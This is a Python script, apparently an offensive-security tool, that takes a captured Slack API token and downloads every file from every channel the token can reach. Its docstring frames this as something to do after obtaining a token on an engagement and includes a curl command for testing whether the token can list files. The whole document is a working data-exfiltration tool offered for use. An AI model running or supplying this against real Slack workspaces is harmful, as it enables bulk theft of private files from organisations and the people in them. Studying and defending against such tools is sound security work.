import argparse
import requests

'''
If you find yourself on an engagement and obtain a Slack token
that has read access to files, this is the tool for you. Simply
run the tool, pass the token, and it'll dump all the files from
all the channels it has access to / is a member of. 

Check if token is valid: 

https://api.slack.com/methods/auth.test/test

Check if token has permissions to the files.list api:

curl -i 'https://slack.com/api/files.list' -H 'Authorization: Bearer xoxb-<tokengoeshere>'

Tool usage: 

python3 dumpslackfiles.py <token>

'''



def get_channel_list(token):
    url = "https://slack.com/api/files.list"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    data = response.json()
    if data.get("ok"):
        return [file_info["channels"][0] for file_info in data["files"]]
    else:
        print("Error retrieving channel list.")
        return []

def get_file_urls(token, channel):
    url = f"https://slack.com/api/files.list?channel={channel}"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    data = response.json()
    if data.get("ok"):
        return [file_info["url_private"] for file_info in data["files"]]
    else:
        print(f"Error retrieving file URLs for channel {channel}.")
        return []

def download_files(token, urls):
    for url in urls:
        response = requests.get(url, headers={"Authorization": f"Bearer {token}"}, stream=True)
        if response.status_code == 200:
            filename = url.split("/")[-1]
            with open(filename, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"Downloaded: {filename}")
        else:
            print(f"Error downloading: {url}")

def main():
    parser = argparse.ArgumentParser(description="Download files from Slack channels")
    parser.add_argument("token", type=str, help="Slack API token")

    args = parser.parse_args()
    token = args.token

    channel_list = get_channel_list(token)
    all_file_urls = []
    for channel in channel_list:
        file_urls = get_file_urls(token, channel)
        all_file_urls.extend(file_urls)
    download_files(token, all_file_urls)

if __name__ == "__main__":
    main()
